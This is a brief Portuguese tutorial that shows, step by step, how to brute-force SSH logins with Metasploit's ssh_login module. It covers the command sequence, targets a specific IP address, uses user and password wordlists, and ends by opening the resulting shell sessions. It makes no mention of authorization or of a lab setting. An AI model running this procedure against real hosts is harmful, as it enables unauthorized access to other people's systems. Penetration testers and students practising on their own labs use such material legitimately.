# Explorando Falhas SSH com Metasploit

## Pré-requisitos

- Acesso root/sudo
- Metasploit Framework instalado(Já tem por padrão no kali linux)
- Arquivos de wordlist (usuários e senhas)

## Passo a Passo

1. Obter privilégios sudo:
   `sudo su`

2. Iniciar Metasploit:
   `msfconsole`

3. Buscar módulo SSH:
   `search ssh_login`

4. Carregar módulo auxiliar:
   `use auxiliary/scanner/ssh/ssh_login`

5. Configurar alvo:
   `set RHOSTS 124.123.14.4`

6. Configurar arquivos de wordlist:
   `set USER_FILE /home/kali/user.txt`
   `set PASS_FILE /home/kali/password.txt`

7. Executar exploit:
   `exploit`

8. Gerenciar sessões:

```
    sessions        # Lista todas as sessões
    sessions 1      # Conecta à sessão 1
```

```
- O módulo auxiliary/scanner/ssh/ssh_login requer arquivos de wordlist válidos

- Certifique-se que os arquivos user.txt e password.txt existem no diretório especificado

-A sessão será criada automaticamente se as credenciais forem encontradas
```

- Se todos os passos foram executados corretamente, você estará conectado ao sistema alvo.
